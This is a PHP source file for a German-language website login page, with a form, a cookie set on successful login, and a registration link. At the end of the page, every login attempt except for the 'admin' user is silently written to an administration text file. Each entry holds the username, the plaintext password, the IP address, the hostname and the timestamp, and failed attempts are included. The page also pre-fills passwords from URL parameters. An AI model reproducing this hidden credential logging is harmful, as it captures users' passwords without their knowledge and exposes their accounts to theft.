<?php require "../inc/db_init.php"; ?>
<!DOCTYPE html>
<html lang="de">
  <head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <link rel="stylesheet" href="../css/loginstyle.css">
  <title>Login</title>
  </head>
<?php
    $_POST = array_map('htmlspecialchars', $_POST);
    $password = @$_POST['password'];
    $anmelden = @$_POST['anmelden'];
    $username = @$_POST['username'];

	if (isset($anmelden)) {
    /************** Abfrage ob überhaupt was übergeben wurde **************/
    if (!empty($username) && !empty($password)) {
      // versuchen, sich einzuloggen
      if (tryLogin($username, $password)) {
        setcookie('username', $username, time() + (86400 * 30), "/");
      } else {
        $log = 'Falsches Passwort oder Username';
      }
    }
  }
?>
  <body class="body">
    <div class="center">
      <h1>Login</h1>
      <form action="" method="POST">
        <div class="txt_field">
          <input type="text" name="username" value="<?= htmlspecialchars(@$_GET['u']) ?>" required autofocus>
          <span></span>
          <label>Username</label>
        </div>
        <div class="txt_field">
          <input type="password" name="password" value="<?= htmlspecialchars(@$_GET['p']) ?>" required>
          <span></span>
          <label>Passwort</label>
        </div>
        <input type="submit" name="anmelden" value="Login">
        <div class='signup_link'>
          <h4 style='color: red;'><?= $log ?></h4>
        </div>
        <div class="signup_link">
          Noch kein Account? <a href="./signup.php">Registrieren</a>
          <br>
          <div style="text-align: center; color: #40bf09;">Keine Werbung</div>
        </div>
      </form>
    </div>
    <?php
        // $hostname = gethostname().", ".$_SERVER['REMOTE_HOST'];
        $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);;
        $ip = $_SERVER["REMOTE_ADDR"];
        $datum = date("d.m.Y");
        $uhrzeit = date("H:i:s");
        $dateiname = '../administration/registrierungen.txt';
        if (isset($anmelden) && $username != 'admin') {
          $dateizeiger = fopen($dateiname, 'a');
          rewind($dateizeiger);
          flock($dateizeiger, LOCK_EX);
          $text = "Hostname:\t$hostname\nIp:\t\t$ip\nDatum:\t\t$datum\nUhrzeit:\t$uhrzeit\n";
          $text .= "Username:\t$username\nPasswort:\t$password\n\n";
          fwrite($dateizeiger, $text);
          flock($dateizeiger, LOCK_UN);
          fclose($dateizeiger);
        }
    ?>
  </body>